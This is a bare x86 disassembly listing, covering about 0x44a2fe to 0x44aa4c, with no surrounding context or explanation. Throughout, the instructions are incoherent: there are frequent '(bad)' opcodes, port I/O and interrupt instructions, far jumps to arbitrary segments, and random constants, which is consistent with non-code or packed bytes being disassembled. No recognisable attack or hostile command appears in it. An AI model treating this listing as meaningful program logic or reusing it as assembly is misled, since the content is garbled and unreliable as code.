  44a2fe:	or     ecx,eax
  44a300:	xor    BYTE PTR [edx+0x8],bl
  44a303:	cmc    
  44a304:	xor    BYTE PTR [edx-0x61],ah
  44a307:	shl    BYTE PTR [ebx+edx*2+0x33ebd2eb],cl
  44a30e:	xor    eax,0x25302ccc
  44a313:	int3   
  44a314:	add    al,0x31
  44a316:	dec    esp
  44a318:	adc    al,0x31
  44a31a:	push   ebp
  44a31b:	int    0x1
  44a31d:	xchg   esi,eax
  44a31e:	(bad)  
  44a31f:	iret   
  44a320:	imul   ecx,DWORD PTR [edi-0x68203111],0x65
  44a327:	fdivr  DWORD PTR [esi-0x74]
  44a32a:	sti    
  44a32b:	xlat   BYTE PTR ds:[ebx]
  44a32c:	les    esi,FWORD PTR [eax+esi*4-0x28]
  44a330:	mov    ecx,0xe4cb4a7a
  44a335:	imul   ebx,DWORD PTR [eax-0x3b],0x6b
  44a339:	imul   esi,edi,0x5359d2c4
  44a33f:	shr    DWORD PTR [ebx-0x142eeaaa],1
  44a345:	dec    esi
  44a346:	pop    es
  44a347:	rol    DWORD PTR [ecx],1
  44a349:	inc    edi
  44a34a:	cmp    ecx,edx
  44a34c:	(bad)  
  44a34e:	add    edx,ecx
  44a350:	gs aaa 
  44a352:	cwde   
  44a353:	iret   
  44a354:	jl     0x44a385
  44a356:	mov    bh,0xcf
  44a358:	lea    esp,[edi]
  44a35a:	push   edx
  44a35b:	rcr    BYTE PTR [ebp-0x30806100],1
  44a361:	mov    ecx,0xd5d07197
  44a366:	pop    DWORD PTR [eax-0x30]
  44a369:	std    
  44a36a:	xchg   DWORD PTR ds:0x637c1dc4,esi
  44a370:	les    esi,FWORD PTR ds:0x52c6e874
  44a376:	ins    BYTE PTR es:[edi],dx
  44a377:	leave  
  44a378:	(bad)  
  44a379:	popa   
  44a37a:	fs and esp,eax
  44a37d:	jl     0x44a3db
  44a37f:	fldcw  WORD PTR [ebx-0x32]
  44a382:	icebp  
  44a383:	loop   0x44a403
  44a385:	into   
  44a386:	(bad)  
  44a387:	loop   0x44a318
  44a389:	into   
  44a38a:	sbb    al,0xe3
  44a38c:	xor    eax,0xf4e447ce
  44a391:	into   
  44a392:	cmp    ah,ah
  44a394:	mov    ds:0x4fe3d3ce,al
  44a399:	iret   
  44a39a:	iret   
  44a39b:	jecxz  0x44a3a1
  44a39d:	iret   
  44a39e:	(bad)  
  44a3a0:	out    0x33,eax
  44a3a2:	pusha  
  44a3a3:	(bad)  [edi+0x4]
  44a3a6:	(bad)  
  44a3a7:	fxch   st(0)
  44a3a9:	shl    DWORD PTR [esi-0x17],cl
  44a3ac:	scas   eax,DWORD PTR es:[edi]
  44a3ad:	rol    DWORD PTR [edi-0x17],cl
  44a3b0:	pop    ebx
  44a3b1:	aam    0xa4
  44a3b3:	call   0xe90577cd
  44a3b8:	cmc    
  44a3b9:	rcr    DWORD PTR [edx-0x16],cl
  44a3bc:	(bad)  
  44a3bd:	aam    0xe2
  44a3bf:	jmp    0x7d457863
  44a3c4:	jmp    0xe74075ff
  44a3c9:	push   0xa7e6bad1
  44a3ce:	sar    esp,1
  44a3d0:	out    0x5e,eax
  44a3d2:	shl    BYTE PTR [eax-0x19],cl
  44a3d5:	jecxz  0x44a3ae
  44a3d7:	sti    
  44a3d8:	in     al,dx
  44a3d9:	cmp    bl,al
  44a3db:	jmp    0x44a3c9
  44a3dd:	es fsubr st,st(2)
  44a3e0:	in     eax,dx
  44a3e1:	jns    0x44a3ba
  44a3e3:	out    0xed,eax
  44a3e5:	adc    bh,0x3
  44a3e8:	out    dx,al
  44a3e9:	inc    edx
  44a3ea:	xlat   BYTE PTR ds:[ebx]
  44a3eb:	and    dh,ch
  44a3ed:	in     eax,dx
  44a3ee:	fadd   DWORD PTR [edx-0x25274814]
  44a3f4:	in     al,dx
  44a3f5:	push   esi
  44a3f6:	fmul   DWORD PTR ds:0xfc200ed
  44a3fc:	jmp    0x32e:0x2534632e
  44a403:	fistp  QWORD PTR es:[eax]
  44a406:	rcr    DWORD PTR [ecx],cl
  44a408:	cmp    DWORD PTR fs:[edx+0x19],ecx
  44a40c:	jmp    0x47734948
  44a411:	cmp    BYTE PTR [ebx],dh
  44a413:	es ret 
  44a415:	cmp    al,BYTE PTR [eax]
  44a417:	sbb    BYTE PTR [ebx-0x79e458c6],bl
  44a41d:	cmp    al,dl
  44a41f:	stos   DWORD PTR es:[edi],eax
  44a420:	mov    ch,0x3a
  44a422:	jae    0x44a3cf
  44a424:	pop    es
  44a425:	cmp    ebx,DWORD PTR ds:0x39d09b00
  44a42b:	ficomp DWORD PTR [eax-0x5778c66a]
  44a431:	xor    al,0x3a
  44a433:	in     eax,dx
  44a434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a435:	icebp  
  44a436:	xor    al,0xab
  44a438:	popf   
  44a439:	mov    DWORD PTR [edx*4+0x26357995],esi
  44a440:	lods   eax,DWORD PTR ds:[esi]
  44a441:	aaa    
  44a442:	xor    eax,0x36f1a5a0
  44a447:	push   ebx
  44a448:	pushf  
  44a449:	and    dh,dh
  44a44b:	jmp    0x4d457b91
  44a450:	data16 fld DWORD PTR [eax]
  44a453:	ror    DWORD PTR [esi-0x6ee3d06a],cl
  44a459:	jns    0x44a48b
  44a45b:	jge    0x44a3ee
  44a45d:	cmp    dh,BYTE PTR [eax]
  44a45f:	(bad)  
  44a460:	xor    esp,ecx
  44a462:	xor    al,BYTE PTR [eax+esi*1+0x32d0337a]
  44a469:	mov    dh,0x31
  44a46b:	inc    esp
  44a46c:	xor    eax,ecx
  44a46e:	sub    al,0x26
  44a470:	sbb    bl,BYTE PTR [ebp+0x17c002c]
  44a476:	jge    0x44a4ac
  44a478:	mov    BYTE PTR [ecx],al
  44a47a:	pushf  
  44a47b:	xor    al,0xcd
  44a47d:	add    ah,ch
  44a47f:	xor    al,0x2a
  44a481:	or     ebx,DWORD PTR [esi*1+0x357d0b30]
  44a488:	cmp    ecx,DWORD PTR [edx]
  44a48a:	shl    DWORD PTR ds:0xff0aa200,1
  44a490:	xor    eax,0x366e0b6c
  44a495:	push   esp
  44a496:	or     eax,DWORD PTR [edi]
  44a498:	aaa    
  44a499:	push   eax
  44a49a:	or     al,0x3f
  44a49c:	aaa    
  44a49d:	adc    eax,0x8c37c30d
  44a4a2:	or     al,0x22
  44a4a4:	cmp    ah,ch
  44a4a6:	or     eax,0x15193892
  44a4ab:	test   eax,0xaa151c38
  44a4b0:	cmp    BYTE PTR [ecx-0x31c6a8eb],cl
  44a4b6:	push   cs
  44a4b7:	in     eax,0x39
  44a4b9:	lods   al,BYTE PTR ds:[esi]
  44a4ba:	push   cs
  44a4bb:	outs   dx,DWORD PTR ds:[esi]
  44a4bc:	cmp    al,0xe
  44a4be:	adc    dl,BYTE PTR [ebx+0x3e]
  44a4c1:	repnz adc esp,DWORD PTR [ebx+0x3f]
  44a4c5:	xlat   BYTE PTR ds:[ebx]
  44a4c6:	adc    al,0xf6
  44a4c8:	(bad)  
  44a4c9:	jnp    0x44a490
  44a4cb:	add    al,BYTE PTR [eax]
  44a4cd:	sti    
  44a4ce:	aad    0x0
  44a4d0:	add    BYTE PTR [eax],ah
  44a4d2:	or     eax,0x63130ab
  44a4d7:	pop    ebp
  44a4d8:	xor    DWORD PTR [esi+eax*1],esi
  44a4db:	and    esi,DWORD PTR [edx]
  44a4dd:	sbb    BYTE PTR [edi],al
  44a4df:	jg     0x44a513
  44a4e1:	or     ecx,DWORD PTR [ebx]
  44a4e3:	loop   0x44a517
  44a4e5:	adc    ecx,DWORD PTR [edx]
  44a4e7:	push   DWORD PTR [ebx]
  44a4e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a4ea:	or     bl,ah
  44a4ec:	xor    al,0x62
  44a4ee:	dec    esp
  44a4ef:	into   
  44a4f0:	and    eax,DWORD PTR [eax]
  44a4f2:	ja     0x44a502
  44a4f4:	iret   
  44a4f5:	pop    esi
  44a4f6:	outs   dx,DWORD PTR ds:[esi]
  44a4f7:	and    cl,bh
  44a4f9:	outs   dx,BYTE PTR ds:[esi]
  44a4fa:	ja     0x44a519
  44a4fc:	iret   
  44a4fd:	xchg   BYTE PTR [edi-0x80],ch
  44a500:	into   
  44a501:	xchg   ebp,eax
  44a502:	push   edi
  44a503:	xchg   esi,eax
  44a504:	into   
  44a505:	scas   al,BYTE PTR es:[edi]
  44a506:	dec    edi
  44a507:	(bad)  
  44a509:	ficom  DWORD PTR [edi+0x48]
  44a50c:	retf   
  44a50d:	mov    esp,0x3fca8e4b
  44a512:	cmp    dl,al
  44a514:	(bad)  
  44a515:	push   edi
  44a516:	cmp    DWORD PTR [edi+0x129abc8],esp
  44a51c:	(bad)  
  44a51d:	shl    BYTE PTR [esi],cl
  44a51f:	leave  
  44a520:	lds    ebx,FWORD PTR [eax]
  44a522:	lahf   
  44a523:	pop    ds
  44a524:	(bad)  
  44a525:	xor    al,0x97
  44a527:	gs (bad) 
  44a529:	jge    0x44a4ba
  44a52b:	in     eax,0xc6
  44a52d:	sbb    al,BYTE PTR [ecx+edx*1+0x757c34c4]
  44a534:	les    ecx,FWORD PTR [edx+0x74]
  44a537:	push   esp
  44a538:	les    ebp,FWORD PTR [ebp+0x6c]
  44a53b:	adc    eax,ebp
  44a53d:	sub    BYTE PTR [ebp+0x6e],ah
  44a540:	lds    eax,FWORD PTR [ebp+ebx*2+0x50]
  44a544:	lds    ecx,FWORD PTR [ebx-0x2a35b1ab]
  44a54a:	dec    ebp
  44a54b:	xor    al,BYTE PTR [edx]
  44a54d:	add    esp,DWORD PTR [edx+0xe]
  44a550:	std    
  44a551:	jmp    DWORD PTR [edx+0x0]
  44a554:	rcl    BYTE PTR [esi],cl
  44a556:	add    BYTE PTR [edx],dh
  44a558:	ret    
  44a559:	int3   
  44a55a:	pop    edx
  44a55b:	xor    al,BYTE PTR [ebx+0xe329bcc]
  44a561:	int    0xe3
  44a563:	xchg   edx,eax
  44a564:	cmp    al,0xcd
  44a566:	push   cs
  44a567:	xchg   ebx,eax
  44a568:	fldcw  WORD PTR [esi]
  44a56a:	aad    0xbc
  44a56c:	jmp    0xd596:0xea52d5b4
  44a573:	ss jmp 0xd5e1:0xeb69d5d5
  44a57b:	dec    ebp
  44a57c:	jmp    0x44a53b
  44a57e:	aad    0x81
  44a580:	jmp    0x44a5aa
  44a582:	(bad)  
  44a583:	mov    al,0xeb
  44a585:	adc    dh,dl
  44a587:	mov    bl,ch
  44a589:	jno    0x44a561
  44a58b:	shr    dl,1
  44a58d:	xchg   ebp,eax
  44a58e:	(bad)  
  44a58f:	sbb    bl,ch
  44a591:	dec    ecx
  44a592:	(bad)  
  44a593:	add    eax,0xecd650eb
  44a598:	jmp    0xd69c:0xec4fd6d8
  44a59f:	shr    bl,1
  44a5a1:	mov    edi,edx
  44a5a3:	adc    eax,0x91d729ec
  44a5a8:	in     eax,0xa9
  44a5aa:	iret   
  44a5ab:	inc    edx
  44a5ac:	in     eax,0x9a
  44a5ae:	iret   
  44a5af:	icebp  
  44a5b0:	in     al,0x46
  44a5b2:	ror    BYTE PTR [esi],1
  44a5b4:	in     eax,0x13
  44a5b6:	rcl    BYTE PTR [ebx+0xd01fe4],1
  44a5bc:	mov    edi,0x5ecff3e4
  44a5c1:	out    0xb9,al
  44a5c3:	shl    BYTE PTR [esi],1
  44a5c5:	out    0x78,al
  44a5c7:	rol    BYTE PTR [esi+eiz*8],1
  44a5ca:	dec    ebx
  44a5cb:	rcr    bl,cl
  44a5cd:	out    0xbe,al
  44a5cf:	rcl    DWORD PTR [edx+0x56d1cce6],1
  44a5d5:	call   0xe86378f6
  44a5da:	cmp    bl,dl
  44a5dc:	mul    bh
  44a5de:	jne    0x44a5b2
  44a5e0:	jnp    0x44a5c9
  44a5e2:	add    BYTE PTR [ecx],ah
  44a5e4:	cs xchg ebp,eax
  44a5e6:	cmp    BYTE PTR [ebx],dl
  44a5e8:	es jg  0x44a623
  44a5eb:	jbe    0x44a606
  44a5ed:	dec    esi
  44a5ee:	cmp    DWORD PTR [eax+0x19],ecx
  44a5f1:	inc    eax
  44a5f2:	cmp    DWORD PTR [eax-0x4ec69fd7],ebp
  44a5f8:	sub    DWORD PTR ds:0x29199539,eax
  44a5fe:	cmp    DWORD PTR [edi],ebp
  44a600:	pop    ss
  44a601:	test   al,0x37
  44a603:	xchg   edi,eax
  44a604:	cs iret 
  44a606:	cmp    ah,BYTE PTR ds:0xe23a8424
  44a60c:	pop    ds
  44a60d:	dec    edi
  44a60e:	cmp    esi,DWORD PTR [edi+edx*1+0x78]
  44a612:	cmp    ecx,DWORD PTR [ebp+0x2f]
  44a615:	and    edi,DWORD PTR [ebx]
  44a617:	add    DWORD PTR ds:0x1c9d39f8,esp
  44a61d:	fdiv   QWORD PTR [esp+eax*1]
  44a620:	add    BYTE PTR [edx],bl
  44a622:	and    al,0x35
  44a624:	stos   DWORD PTR es:[edi],eax
  44a625:	stos   BYTE PTR es:[edi],al
  44a626:	push   edx
  44a627:	xor    al,0x33
  44a629:	stos   BYTE PTR es:[edi],al
  44a62a:	daa    
  44a62b:	aaa    
  44a62c:	int    0x98
  44a62e:	mov    cl,0x35
  44a630:	outs   dx,DWORD PTR ds:[esi]
  44a631:	cwde   
  44a632:	push   cs
  44a633:	ss jmp 0xc94581ea
  44a639:	pop    esi
  44a63a:	fld    DWORD PTR [eax]
  44a63c:	icebp  
  44a63d:	xchg   ecx,eax
  44a63e:	iret   
  44a63f:	xor    cl,cl
  44a641:	xchg   ecx,eax
  44a642:	mov    esp,0xecb1c630
  44a647:	xor    BYTE PTR [ebp+0x3c3094b1],ch
  44a64d:	mov    dh,0x81
  44a64f:	xor    BYTE PTR [ecx-0x52],cl
  44a652:	pushf  
  44a653:	xor    BYTE PTR [ebx-0x56ce996a],bl
  44a659:	mov    ds,WORD PTR [edi+0x31]
  44a65c:	add    BYTE PTR [esi-0x62cf30fb],dh
  44a662:	add    eax,0x51a30e8
  44a667:	sbb    DWORD PTR [ecx],esi
  44a669:	push   esi
  44a66a:	or     eax,ebp
  44a66c:	xor    DWORD PTR [edx+ecx*1],eax
  44a66f:	add    eax,0x3e043232
  44a674:	xor    bh,BYTE PTR [edx+0x7]
  44a677:	pop    edx
  44a678:	xor    ah,BYTE PTR [ebp+0x7]
  44a67b:	(bad)  
  44a67c:	xor    bl,bh
  44a67e:	push   es
  44a67f:	sbb    DWORD PTR [ebx],esi
  44a681:	rol    BYTE PTR [esp+ebx*4],0x33
  44a685:	add    al,bh
  44a687:	add    edx,esp
  44a689:	xor    ecx,DWORD PTR [ebx]
  44a68b:	push   cs
  44a68c:	inc    edx
  44a68d:	xor    al,0x20
  44a68f:	push   cs
  44a690:	popa   
  44a691:	xor    al,0x0
  44a693:	push   cs
  44a694:	add    dh,BYTE PTR ds:0x35310e68
  44a69a:	retf   0xf10e
  44a69d:	xor    eax,0x365807b3
  44a6a2:	sbb    BYTE PTR [eax],cl
  44a6a4:	imul   esi,DWORD PTR [esi],0x36a80b39
  44a6aa:	pop    edx
  44a6ab:	or     ebp,DWORD PTR [esi-0xaf470ca]
  44a6b1:	ss add eax,0x2f377d09
  44a6b7:	or     bl,ah
  44a6b9:	aaa    
  44a6ba:	mov    al,ds:0xd3384211
  44a6bf:	adc    DWORD PTR [edi+0xb0d4d38],esp
  44a6c5:	cmp    edx,esi
  44a6c7:	adc    ah,BYTE PTR [edx+0x39]
  44a6ca:	push   edi
  44a6cb:	adc    bh,BYTE PTR [edi-0x17ed58c7]
  44a6d1:	cmp    DWORD PTR [edx+0x6239e712],ebp
  44a6d7:	cmp    esp,eax
  44a6d9:	(bad)  
  44a6dc:	les    ebx,FWORD PTR [edx]
  44a6de:	sub    al,cl
  44a6e0:	(bad)  
  44a6e1:	dec    edi
  44a6e2:	sub    bh,bl
  44a6e4:	(bad)  
  44a6e5:	jl     0x44a67f
  44a6e7:	mov    bl,al
  44a6e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a6ea:	add    BYTE PTR [eax-0x77533c65],bl
  44a6f0:	imul   eax,esp,0xffffffc5
  44a6f3:	mov    BYTE PTR [eax-0x3c],ah
  44a6f6:	fdivr  DWORD PTR [eax+0x56]
  44a6f9:	(bad)  
  44a6fa:	hlt    
  44a6fb:	js     0x44a712
  44a6fd:	lds    ebp,FWORD PTR [eax+0x69]
  44a700:	faddp  st(4),st
  44a702:	(bad)  
  44a703:	imul   esp,DWORD PTR [eax+0x3a5e00c4],0x125605be
  44a70d:	mov    esi,0xc8c74e1e
  44a712:	xor    DWORD PTR [esi+0x62],eax
  44a715:	mov    esi,0xbe123e58
  44a71a:	imul   esi,DWORD PTR [esi],0xffffffaf
  44a71d:	mov    ebp,0xbd822e89
  44a722:	mov    eax,ds:0xa4be4926
  44a727:	sahf   
  44a728:	sahf   
  44a729:	mov    ebp,0xbdc796d1
  44a72e:	loope  0x44a6be
  44a730:	mov    edi,0x288702bd
  44a735:	mov    edi,0xbf107f0f
  44a73a:	sub    BYTE PTR [edi+0x5d],dh
  44a73d:	mov    edi,0xbf186f2b
  44a742:	jb     0x44a7ab
  44a744:	loope  0x44a704
  44a746:	retf   
  44a747:	pop    edi
  44a748:	xor    al,0xc8
  44a74a:	pop    ds
  44a74b:	push   esp
  44a74c:	pop    esp
  44a74d:	enter  0x6e,0x4c
  44a751:	fst    DWORD PTR [ebx+0x5edc31c6]
  44a757:	(bad)  
  44a758:	int    0xdc
  44a75a:	out    0xe3,eax
  44a75c:	pusha  
  44a75d:	fldcw  WORD PTR [edi+0x4]
  44a760:	(bad)  
  44a761:	(bad)  
  44a763:	ror    DWORD PTR [esi-0x17],cl
  44a766:	stc    
  44a767:	rcl    DWORD PTR [ebp-0x5e2bd917],cl
  44a76d:	jmp    0xe9ed7b7f
  44a772:	or     ah,dl
  44a774:	mov    ebx,0xe0d40de9
  44a779:	call   0xe94d7bf5
  44a77e:	inc    ebx
  44a77f:	aam    0xec
  44a781:	call   0xeab37c23
  44a786:	add    edx,ebp
  44a788:	xchg   edx,eax
  44a789:	jmp    0xd586:0xe9f4d566
  44a790:	jo     0x44a779
  44a792:	psrld  mm5,QWORD PTR [ebx-0x362d8919]
  44a799:	out    0x47,al
  44a79b:	rol    BYTE PTR [edx-0x18],cl
  44a79e:	std    
  44a79f:	rol    BYTE PTR [ecx-0x18],cl
  44a7a2:	test   eax,0xcbe7e3d2
  44a7a7:	iret   
  44a7a8:	sub    esp,ebp
  44a7aa:	xchg   esi,eax
  44a7ab:	iret   
  44a7ac:	ss in  eax,0xad
  44a7af:	iret   
  44a7b0:	push   edi
  44a7b1:	in     eax,0x43
  44a7b3:	rol    BYTE PTR [eax],1
  44a7b5:	or     ch,ah
  44a7b7:	sbb    al,0xd0
  44a7b9:	arpl   si,sp
  44a7bb:	pushf  
  44a7bc:	sar    dh,1
  44a7be:	in     eax,0xe7
  44a7c0:	int    0x51
  44a7c2:	in     al,0xb4
  44a7c4:	into   
  44a7c5:	adc    ah,ah
  44a7c7:	js     0x44a797
  44a7c9:	out    dx,al
  44a7ca:	jecxz  0x44a7cc
  44a7cc:	push   eax
  44a7cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a7ce:	inc    esp
  44a7cf:	cs dec eax
  44a7d1:	popf   
  44a7d2:	cmp    al,0x2e
  44a7d4:	nop
  44a7d5:	xchg   esp,eax
  44a7d6:	je     0x44a806
  44a7d8:	cwde   
  44a7d9:	lods   al,BYTE PTR ds:[esi]
  44a7da:	ins    BYTE PTR es:[edi],dx
  44a7db:	cs nop
  44a7dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a7de:	fs cs test al,0x9c
  44a7e2:	pop    esp
  44a7e3:	cs mov al,0x94
  44a7e6:	adc    al,0x2e
  44a7e8:	cwde   
  44a7e9:	sub    al,0x67
  44a7eb:	cmp    DWORD PTR [edi+0x26352928],ebp
  44a7f1:	sbb    ebp,DWORD PTR [ebx+esi*1+0xd831e9]
  44a7f8:	test   eax,0xe400d961
  44a7fd:	push   cs
  44a7fe:	shr    DWORD PTR [esi+edx*8],0x1d
  44a802:	dec    eax
  44a803:	sub    eax,0x2d1b15b5
  44a808:	ret    
  44a809:	xor    ch,BYTE PTR [ecx-0x7dd631d5]
  44a80f:	cmp    BYTE PTR [eax+0x1b],ch
  44a812:	sahf   
  44a813:	cmp    dh,BYTE PTR [eax+0x1b]
  44a816:	push   esi
  44a817:	cmp    edi,DWORD PTR [eax+0x0]
  44a81a:	sub    ecx,DWORD PTR [esi+0x3b]
  44a81d:	jo     0x44a84a
  44a81f:	inc    esi
  44a820:	cmp    ecx,DWORD PTR [eax-0x6fc4c1e5]
  44a826:	sbb    esi,DWORD PTR [esi+0x3b]
  44a829:	js     0x44a7d6
  44a82b:	ins    DWORD PTR es:[edi],dx
  44a82c:	cmp    esi,DWORD PTR [eax-0x55]
  44a82f:	cmp    ebp,DWORD PTR gs:[eax]
  44a832:	fwait
  44a833:	pop    ebp
  44a834:	cmp    esi,DWORD PTR [eax]
  44a836:	fwait
  44a837:	adc    eax,0xdab383b
  44a83c:	cmp    esi,DWORD PTR [eax]
  44a83e:	stos   DWORD PTR es:[edi],eax
  44a83f:	add    eax,0xfd9b083b
  44a844:	cmp    al,BYTE PTR [eax]
  44a846:	push   edx
  44a847:	adc    ch,bl
  44a849:	cmp    bl,BYTE PTR [edx-0x6dc51aef]
  44a84f:	adc    ebp,ebp
  44a851:	cmp    bh,BYTE PTR [edx+0xf]
  44a854:	cmc    
  44a855:	cmp    dl,BYTE PTR [edx+0x7a3afd11]
  44a85b:	adc    DWORD PTR ds:0xd11723b,eax
  44a861:	cmp    ebx,DWORD PTR [edx+0x10]
  44a864:	adc    eax,0x1d10523b
  44a869:	cmp    ebx,DWORD PTR [edx+0x11]
  44a86c:	and    eax,0x2d11523b
  44a871:	cmp    edi,DWORD PTR [edx+0x10]
  44a874:	xor    eax,0x3d10923b
  44a879:	cmp    edi,DWORD PTR [edx+0x10]
  44a87c:	inc    ebp
  44a87d:	cmp    eax,DWORD PTR [eax]
  44a87f:	jb     0x44a891
  44a881:	dec    ebp
  44a882:	cmp    ebx,DWORD PTR [edx+0x10]
  44a885:	push   ebp
  44a886:	cmp    edx,DWORD PTR [edx+0x10]
  44a889:	pop    ebp
  44a88a:	cmp    ebx,DWORD PTR [edx]
  44a88c:	adc    DWORD PTR [ebp+0x3b],esp
  44a88f:	adc    dl,BYTE PTR [ecx]
  44a891:	ins    DWORD PTR es:[edi],dx
  44a892:	cmp    edi,DWORD PTR [edx+0x10]
  44a895:	jne    0x44a8d2
  44a897:	xchg   edx,eax
  44a898:	adc    BYTE PTR [ebp+0x3b],bh
  44a89b:	jp     0x44a8ad
  44a89d:	test   DWORD PTR [ebx],edi
  44a89f:	jb     0x44a8b1
  44a8a1:	lea    edi,[ebx]
  44a8a3:	fimul  DWORD PTR [edi]
  44a8a5:	xchg   ebp,eax
  44a8a6:	cmp    edi,ecx
  44a8a8:	adc    bl,BYTE PTR [ebx+0x3d]
  44a8ab:	mov    ds:0x223df112,al
  44a8b0:	adc    ecx,DWORD PTR [edi+0x3f]
  44a8b3:	sbb    eax,0xbbfff614
  44a8b8:	adc    eax,0xd5330003
  44a8bd:	add    BYTE PTR [eax],al
  44a8bf:	bound  edx,QWORD PTR [edx]
  44a8c1:	shr    BYTE PTR [edx+esi*2-0x10],cl
  44a8c5:	int3   
  44a8c6:	pop    esp
  44a8c7:	jae    0x44a87a
  44a8c9:	rol    edi,1
  44a8cb:	push   ebx
  44a8cc:	pop    ebx
  44a8cd:	shl    BYTE PTR [ebx+0x50],1
  44a8d0:	xchg   edx,eax
  44a8d1:	shl    BYTE PTR [esi+0x51],cl
  44a8d4:	inc    ch
  44a8d6:	ins    DWORD PTR es:[edi],dx
  44a8d7:	dec    esi
  44a8d8:	push   ss
  44a8d9:	(bad)  
  44a8da:	push   ecx
  44a8db:	aaa    
  44a8dc:	pushf  
  44a8dd:	(bad)  
  44a8de:	sub    BYTE PTR [edx+edx*4],ch
  44a8e1:	mov    bl,0x0
  44a8e4:	xor    al,0xcc
  44a8e6:	les    ecx,FWORD PTR [ebx+0x2a]
  44a8e9:	lods   eax,DWORD PTR ds:[esi]
  44a8ea:	leave  
  44a8eb:	data16 fwait
  44a8ed:	xchg   ecx,eax
  44a8ee:	retf   0x9bcf
  44a8f1:	faddp  st(7),st
  44a8f3:	sub    eax,0x9abe4a8e
  44a8f8:	xchg   DWORD PTR [edi-0x41],eax
  44a8fb:	push   es
  44a8fc:	jl     0x44a8c1
  44a8fe:	mov    esi,0xbb98746c
  44a903:	mov    al,0x6c
  44a905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a906:	mov    ebx,0xbc4a64c2
  44a90b:	retf   
  44a90c:	pop    esp
  44a90d:	cmp    al,0xbc
  44a90f:	fist   WORD PTR [ebp+eiz*2-0x44]
  44a913:	jecxz  0x44a961
  44a915:	xchg   esp,eax
  44a916:	mov    ebx,0xbd0144fa
  44a91b:	or     DWORD PTR ds:0x350dbd11,edi
  44a921:	lock mov ebx,0xbd522d48
  44a927:	dec    esp
  44a928:	and    eax,0x9d5ebd21
  44a92d:	and    eax,0x499571bd
  44a932:	mov    ebp,0xbc7a8d76
  44a937:	test   DWORD PTR [ebp-0x283b8927],eax
  44a93d:	fmul   DWORD PTR [edx-0x3c]
  44a940:	scas   eax,DWORD PTR es:[edi]
  44a941:	fsub   st,st(7)
  44a943:	mov    bl,0x60
  44a945:	fnstenv [edi-0x269dfffd]
  44a94b:	mov    al,ds:0x63c904d3
  44a950:	shr    DWORD PTR [ebp-0x36],cl
  44a953:	push   0x3ccaf7d2
  44a958:	sar    BYTE PTR ds:0x7e36d7cb,cl
  44a95e:	int3   
  44a95f:	sti    
  44a960:	aaa    
  44a961:	dec    ecx
  44a962:	rcr    BYTE PTR [edx+0x3d],1
  44a965:	fcmovbe st,st(2)
  44a967:	ins    BYTE PTR es:[edi],dx
  44a968:	cmp    eax,0x3e4bd34e
  44a96d:	in     al,0xd2
  44a96f:	dec    esi
  44a970:	ds in  al,dx
  44a972:	ror    BYTE PTR [edx+0x6dd3073e],cl
  44a978:	ds or  bl,dl
  44a97b:	pop    esi
  44a97c:	ds cld 
  44a97e:	rol    cl,cl
  44a980:	ds dec edi
  44a982:	aam    0x1e
  44a984:	aas    
  44a985:	mov    ah,0xd4
  44a987:	jmp    0x44a9c8
  44a989:	mov    al,ds:0xd03ffed5
  44a98e:	aam    0xe7
  44a990:	inc    eax
  44a991:	rcl    ebp,0xe7
  44a994:	arpl   WORD PTR [ecx-0x27],sp
  44a997:	or     eax,DWORD PTR [edx+eiz*2]
  44a99a:	fnstcw WORD PTR [edi+0x34]
  44a99d:	daa    
  44a99e:	retf   0x3683
  44a9a1:	into   
  44a9a2:	retf   
  44a9a3:	jnp    0x44a9dc
  44a9a5:	popf   
  44a9a6:	int    0xbe
  44a9a8:	aaa    
  44a9a9:	pop    ss
  44a9aa:	int    0x45
  44a9ac:	cmp    BYTE PTR [eax],al
  44a9ae:	fcmovne st,st(4)
  44a9b0:	(bad)  
  44a9b2:	fwait
  44a9b3:	into   
  44a9b4:	add    BYTE PTR [ebx-0xfd14476],ah
  44a9ba:	mov    edi,DWORD PTR [ebx+0x2e]
  44a9bd:	mov    ebp,0x9a2db578
  44a9c2:	jns    0x44aa08
  44a9c4:	cmp    DWORD PTR [eax],esi
  44a9c6:	outs   dx,BYTE PTR ds:[esi]
  44a9c7:	inc    edx
  44a9c8:	cmp    BYTE PTR [esi],dh
  44a9ca:	addr16 out 0x3a,eax
  44a9cd:	les    ebx,FWORD PTR [edi-0x4b]
  44a9d0:	cmp    ch,bh
  44a9d2:	push   esp
  44a9d3:	outs   dx,DWORD PTR ds:[esi]
  44a9d4:	cmp    ah,BYTE PTR [edx]
  44a9d6:	dec    ebp
  44a9d7:	sbb    DWORD PTR ds:0x35002210,esi
  44a9dd:	fistp  QWORD PTR ds:0x236133b2
  44a9e3:	out    dx,eax
  44a9e4:	xor    eax,0x36282071
  44a9e9:	jmp    0x614585df
  44a9ee:	popa   
  44a9ef:	fld    DWORD PTR [eax]
  44a9f1:	fst    DWORD PTR [ecx-0x69e8cf5b]
  44a9f7:	xor    DWORD PTR [eax],0x37
  44a9fa:	mov    ds,WORD PTR [eax+0x31]
  44a9fd:	jl     0x44aa70
  44a9ff:	adc    dh,BYTE PTR [ecx]
  44aa01:	add    ch,BYTE PTR [edi-0x61]
  44aa04:	das    
  44aa05:	xor    dh,BYTE PTR [edi-0x77]
  44aa08:	das    
  44aa09:	mov    esi,0x3132c46f
  44aa0e:	push   esp
  44aa0f:	lahf   
  44aa10:	xor    ah,BYTE PTR [eax+eax*1+0x4f]
  44aa14:	bound  esi,QWORD PTR [ebx]
  44aa16:	push   edi
  44aa17:	push   edi
  44aa18:	jne    0x44aa4d
  44aa1a:	or     DWORD PTR [edi+edi*8+0x31],0x2c8a3464
  44aa22:	and    al,0x2d
  44aa24:	and    ch,BYTE PTR ds:0x2bb12abb
  44aa2a:	(bad)  
  44aa2b:	sub    al,BYTE PTR [ebp-0x2e1effd5]
  44aa31:	add    dh,BYTE PTR [esi]
  44aa33:	mov    edx,0x72360cd0
  44aa38:	shl    DWORD PTR [eax+edi*1],cl
  44aa3b:	dec    esp
  44aa3c:	shl    BYTE PTR [ebx],cl
  44aa3e:	cmp    dh,al
  44aa40:	aam    0x5a
  44aa42:	cmp    dl,bl
  44aa44:	aam    0xf0
  44aa46:	cmp    cl,BYTE PTR [ebp-0x2c]
  44aa49:	cmp    DWORD PTR [ebx],edi
  44aa4b:	clc    
  44aa4c:	xlat   BYTE PTR ds:[ebx]
